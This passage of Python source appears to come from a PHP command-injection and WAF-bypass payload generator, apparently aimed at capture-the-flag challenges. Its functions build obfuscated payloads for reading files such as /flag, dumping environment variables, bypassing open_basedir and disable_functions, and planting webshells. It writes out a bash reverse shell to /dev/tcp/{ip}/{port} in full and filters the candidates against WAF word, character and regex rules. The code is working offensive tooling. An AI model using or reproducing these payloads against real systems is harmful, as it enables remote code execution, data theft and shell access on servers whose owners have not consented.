    return utils.dedupe_preserve_order(out)


def _render_url_decode_file_read_payloads(options: "BypassOptions"):
    if not _is_file_read_path_auto_context(options):
        return []
    ctx = options.auto_context
    preprocessors = {item.lower() for item in (ctx.preprocessors or [])}
    if not {"urldecode", "rawurldecode"} & preprocessors:
        return []

    out = []
    path = options.flagfile or "/flag"
    for target in _file_read_target_variants(path):
        encoded = utils.percent_encode_each_byte(target)
        out.append(encoded)
        out.append(utils.url_encode(encoded))
        with_nul = encoded + "%00"
        out.append(with_nul)
        out.append(with_nul + ".php")
        out.append(utils.url_encode(with_nul))
        out.append(utils.url_encode(with_nul + ".php"))
    return utils.dedupe_preserve_order(out)


def _render_encoding_transform_file_read_payloads(options: "BypassOptions"):
    if not _is_file_read_path_auto_context(options):
        return []
    ctx = options.auto_context
    preprocessors = {item.lower() for item in (ctx.preprocessors or [])}
    if not {"iconv", "mb_convert_encoding"} & preprocessors:
        return []

    path = options.flagfile or "/flag"
    return utils.dedupe_preserve_order(
        [
            utils.build_iconv_ignore_interleaved_ascii_payload(target)
            for target in _file_read_target_variants(path)
            if target
        ]
    )


def _render_php7_only_payloads(options: "BypassOptions"):
    ctx = options.auto_context
    if ctx is None:
        return []
    version = _php_version(options)
    if version < utils.parse_php_version("7.0"):
        return []
    path = options.flagfile or "/flag"
    return [_safe_format(t, path=path) for t in bypass_data.AUTO_PHP7_ONLY]


def _render_open_basedir_payloads(options: "BypassOptions"):
    ctx = options.auto_context
    if ctx is None or not ctx.open_basedir:
        return []
    path = options.flagfile or "/flag"
    out = []
    version = _php_version(options)
    for tpl in bypass_data.AUTO_OPEN_BASEDIR_BYPASS:
        rendered = _safe_format(tpl, path=path)
        if "ini_set('open_basedir','..')" in rendered and version >= utils.parse_php_version("8.3"):
            continue
        out.append(rendered)
    return out


def _render_disable_fn_payloads(options: "BypassOptions"):
    ctx = options.auto_context
    if ctx is None or not ctx.disable_functions:
        return []
    disabled = {d.lower() for d in ctx.disable_functions}
    path = options.flagfile or "/flag"
    out = []
    version = _php_version(options)
    for tpl in bypass_data.AUTO_DISABLE_FN_BYPASS:
        rendered = _safe_format(tpl, path=path)
        if "FFI::cdef" in rendered and version < utils.parse_php_version("7.4"):
            continue
        # Skip templates that use a disabled function.
        first_call = rendered.split("(")[0].rstrip()
        first_name = first_call.rsplit(";", 1)[-1].strip().lstrip("$")
        if first_name.lower() in disabled:
            continue
        out.append(rendered)
    return out


def _render_preprocessor_wrapped(options: "BypassOptions", existing):
    """Apply preprocessor-aware transforms to the existing candidate pool."""
    ctx = options.auto_context
    if ctx is None or not ctx.preprocessors:
        return []
    out = []
    pp = [p.lower() for p in ctx.preprocessors]
    url_rounds = pp.count("urldecode") + pp.count("rawurldecode")
    wraps_base64 = "base64_decode" in pp
    for payload in existing:
        # urldecode round-trip: pre-encode the payload N times so the server
        # decoder restores it to the original.
        enc = payload
        for _ in range(url_rounds):
            enc = utils.url_encode(enc)
        if enc != payload:
            out.append(enc)
        if wraps_base64:
            out.append(utils.base64_encode(payload))
    return out


def _generate_auto_only_candidates(options: "BypassOptions", base_candidates):
    out = []
    out.extend(_render_argument_injection_payloads(options))
    out.extend(_render_sanitizer_aware_payloads(options))
    out.extend(_render_precise_webshell_payloads(options))
    out.extend(_render_file_read_path_payloads(options))
    out.extend(_render_null_byte_file_read_payloads(options))
    out.extend(_render_url_decode_file_read_payloads(options))
    out.extend(_render_encoding_transform_file_read_payloads(options))
    out.extend(_render_php7_only_payloads(options))
    out.extend(_render_open_basedir_payloads(options))
    out.extend(_render_disable_fn_payloads(options))
    out.extend(_render_preprocessor_wrapped(options, base_candidates + out))
    return out


def generate_candidates(options: BypassOptions):
    payloads = []
    target_cmd = None
    php_version = _php_version(options)
    disabled_functions = _disabled_functions(options)

    root_discovery_mode = (
        options.flagfile == "/"
        and not options.read_env
        and not options.reflect_shell
        and not options.phpinfo
    )

    if options.flagfile:
        if root_discovery_mode:
            payloads.extend(bypass_data.ROOT_DISCOVERY_TEMPLATES)
            payloads.extend(bypass_data.DIRECTORY_ENUM_TEMPLATES)
            payloads.extend(_render_backtick_payloads("ls /"))
        else:
            target_cmd = f"cat {options.flagfile}"

            for template in bypass_data.READFILE_TEMPLATES:
                payloads.append(template.format(path=options.flagfile, keyword="flag"))
                payloads.append(template.format(path=_wildcard_bypass(options.flagfile), keyword="flag"))
                payloads.append(template.format(path=utils.obfuscate_filename_escape(options.flagfile), keyword="flag"))
                payloads.append(template.format(path=utils.obfuscate_filename_quotes(options.flagfile), keyword="flag"))

            path_variants = [
                options.flagfile,
                _wildcard_bypass(options.flagfile),
                utils.obfuscate_filename_escape(options.flagfile),
                utils.obfuscate_filename_quotes(options.flagfile),
            ]
            for cmd_template in bypass_data.BACKTICK_COMMAND_TEMPLATES:
                for path_variant in path_variants:
                    cmd = cmd_template.format(path=path_variant)
                    payloads.extend(_render_backtick_payloads(cmd))

            for template in bypass_data.INCLUDE_TEMPLATES:
                payloads.append(template.format(path=options.flagfile))

            payloads.extend(bypass_data.FILE_ENUM_TEMPLATES)
            if options.flagfile == "/":
                payloads.extend(bypass_data.ROOT_DISCOVERY_TEMPLATES)

    if options.read_env:
        payloads.extend(bypass_data.READ_ENV_TEMPLATES)
        _append_upload_exec_payloads(payloads)
        target_cmd = "env"

    if options.reflect_shell:
        for template in bypass_data.REFLECT_SHELL_TEMPLATES:
            payloads.append(template.format(ip=options.ip, port=options.port))

        _append_upload_exec_payloads(payloads)

        shell_cmd = f"bash -c 'bash -i >& /dev/tcp/{options.ip}/{options.port} 0>&1'"
        for template in bypass_data.WEBSHELL_TEMPLATES:
            payloads.append(template.format(cmd=shell_cmd))

        target_cmd = shell_cmd

    if options.phpinfo:
        for template in bypass_data.PHPINFO_TEMPLATES:
            if template.startswith("(") and template.endswith(");") and php_version < utils.parse_php_version("7.0"):
                continue
            payloads.append(template)
        target_cmd = "phpinfo"

    if options.read_env or options.phpinfo:
        payloads.extend(bypass_data.HEADER_EXEC_TEMPLATES)

    if options.reflect_shell or options.phpinfo:
        payloads.extend(bypass_data.VARIABLE_HIJACK_TEMPLATES)

    if target_cmd:
        payloads.append(bypass_data.NON_ALNUM_ASSERT_POST_PAYLOAD)
        payloads.append(utils.generate_nan_seed_post_gateway())
        if target_cmd == "phpinfo":
            inc_code = utils.generate_php_increment("phpinfo")
            if inc_code:
                increment_payload = f"{inc_code};$_____();"
                _append_increment_with_url(payloads, increment_payload)

            if php_version >= utils.parse_php_version("7.0"):
                not_code = utils.generate_php_not("phpinfo")
                payloads.append(f"{not_code}();")

            chr_phpinfo = utils.generate_php_chr("phpinfo")
            payloads.append(f"$_={chr_phpinfo};$_();")
        else:
            payloads.extend(
                _generate_php_rce_payloads(
                    target_cmd,
                    php_version,
                    disabled_functions=disabled_functions,
                )
            )

    if options.upload:
        raw_payloads = payloads.copy()
        shell_wrapped = _apply_upload_shell_wrappers(raw_payloads)
        php_wrapped = _apply_upload_php_wrappers(raw_payloads, php_version)
        existing_wrapped = [p for p in raw_payloads if _is_upload_wrapper_like_payload(p)]
        payloads = utils.dedupe_preserve_order(shell_wrapped + php_wrapped + existing_wrapped)

    if not options.upload:
        base_payloads = payloads.copy()
        for payload in base_payloads:
            if ";" not in payload and "(" not in payload:
                payloads.append(_base64_pipe_bypass(payload))

    if not root_discovery_mode and not options.upload:
        simple_cmds = ["ls", "cat /flag", "tac /flag", "env"]
        for cmd in simple_cmds:
            payloads.append(_octal_encode(cmd))

    # Auto-only
    if options.auto_context is not None:
        auto_only = _generate_auto_only_candidates(options, payloads)
        payloads.extend(auto_only)

    candidates = utils.dedupe_preserve_order(payloads)
    candidates = [payload for payload in candidates if payload != "`/`"]
    candidates = _filter_payloads_for_runtime(candidates, options)
    return _filter_payloads_for_context(candidates, options.payload_context)


def apply_encodings(payloads, strategies):
    encoded = []
    for payload in payloads:
        for _name, encoder in strategies:
            try:
                encoded.append(encoder(payload))
            except Exception:
                continue
    return utils.dedupe_preserve_order(encoded)


def filter_payloads(
    payloads,
    waf_words,
    waf_chars,
    waf_regex,
    limit_length,
    show_progress=True,
    verbose=False,
    progress_callback=None,
    trace_callback=None,
):
    passed = []
    progress = ProgressBar(len(payloads), verbose=verbose) if show_progress else None
    total = len(payloads)
    for idx, payload in enumerate(payloads, start=1):
        if progress:
            progress.update(idx)
        if progress_callback and (idx == 1 or idx % 100 == 0 or idx == total):
            progress_callback(
                {
                    "type": "progress",
                    "current": idx,
                    "total": total,
                    "passed": len(passed),
                }
            )
        allowed = utils.is_payload_allowed(payload, waf_words, waf_chars, waf_regex, limit_length)
        if trace_callback:
            event = {
                "type": "filter",
                "current": idx,
                "total": total,
                "payload": payload,
                "techniques": list(infer_payload_techniques(payload)),
                "allowed": allowed,
                "payload_length": len(payload),
            }
            if not allowed:
                blocked = _analyze_block_reasons(payload, waf_words, waf_chars, waf_regex)
                if limit_length is not None and len(payload) > limit_length:
                    blocked["limit_length"] = limit_length
                event["blocked"] = blocked
            trace_callback(event)
        if allowed:
            passed.append(payload)
            if progress:
                progress.mark_pass(payload)
            if progress_callback and verbose:
                progress_callback(
                    {
                        "type": "pass",
                        "current": idx,
                        "total": total,
                        "passed": len(passed),
                        "payload": payload,
                    }
                )
    if progress:
        progress.finish()
    return passed


class ProgressBar:
    def __init__(self, total, width=24, stream=None, verbose=False):
        import sys

        self.total = max(int(total), 0)
        self.width = max(int(width), 5)
        self.stream = stream or sys.stdout
        self.current = 0
        self.passed = 0
        self.verbose = verbose
        self.last_snapshot = None

        isatty = getattr(self.stream, "isatty", None)
        self.dynamic = bool(isatty() if callable(isatty) else False)

        if not self.dynamic:
            self._write_line(end="\n", force=True)

    def update(self, current):
        self.current = current
        if self.dynamic:
            self._write_line()

    def mark_pass(self, payload):
        self.passed += 1
        if self.verbose:
            if self.dynamic:
                self._write_line(end="\n", force=True)
            self._write(f"PASS: {payload}\n")
            if self.dynamic:
                self._write_line(force=True)
        elif self.dynamic:
            self._write_line()

    def finish(self):
        self.current = self.total
        if self.dynamic:
            if self.last_snapshot == (self.current, self.passed):
                self._write("\n")
            else:
                self._write_line(end="\n")
        else:
            self._write_line(end="\n", force=True)

    def _write_line(self, end="", force=False):
        snapshot = (self.current, self.passed)
        if not force and snapshot == self.last_snapshot:
            return
        self.last_snapshot = snapshot

        bar = self._render_bar()
        if self.dynamic:
            msg = f"\r\033[2K{bar} {self.current}/{self.total} passed:{self.passed}"
        else:
            msg = f"{bar} {self.current}/{self.total} passed:{self.passed}"
        self._write(msg + end)

    def _render_bar(self):
        if self.total <= 0:
            filled = 0
        else:
            filled = int(self.width * (self.current / self.total))
        return "[" + ("=" * filled).ljust(self.width, ".") + "]"

    def _write(self, text):
        self.stream.write(text)
        self.stream.flush()
